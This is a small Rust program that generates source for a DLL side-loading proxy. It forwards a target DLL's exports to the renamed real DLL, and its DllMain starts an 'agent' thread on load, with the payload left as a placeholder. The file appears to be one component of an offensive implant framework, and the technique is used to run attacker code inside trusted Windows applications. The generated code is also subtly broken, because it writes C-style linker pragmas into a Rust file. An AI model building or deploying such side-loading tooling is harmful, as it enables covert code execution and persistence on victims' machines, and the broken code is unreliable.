use std::env;
use std::fs;

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        println!("Usage: orchestra-side-load-gen <target_dll_name> <export1,export2,...>");
        return;
    }
    let target_dll = &args[1];
    let exports = args[2].split(',').collect::<Vec<&str>>();

    let mut pragma_lines = String::new();
    for export in exports {
        // e.g. #pragma comment(linker, "/export:OriginalFunction=real_dll.OriginalFunction")
        pragma_lines.push_str(&format!("#pragma comment(linker, \"/export:{}=real_{}.{}\")\n", export, target_dll, export));
    }

    let code = format!("
// auto-generated DLL side-loading forwarder
{}

use winapi::um::winnt::DLL_PROCESS_ATTACH;
use winapi::um::libloaderapi::DisableThreadLibraryCalls;
use winapi::shared::minwindef::{{HINSTANCE, DWORD, LPVOID}};

#[no_mangle]
#[allow(non_snake_case)]
pub extern \"system\" fn DllMain(hinst: HINSTANCE, reason: DWORD, _reserved: LPVOID) -> i32 {{
    if reason == DLL_PROCESS_ATTACH {{
        unsafe {{ DisableThreadLibraryCalls(hinst); }}
        // spawn agent early
        std::thread::spawn(|| {{
            // the payload...
            println!(\"Agent init in side-loaded DLL\");
        }});
    }}
    1
}}
", pragma_lines);

    fs::write("side_loaded.rs", code).unwrap();
    println!("Generated side_loaded.rs to forward exports for {}", target_dll);
}
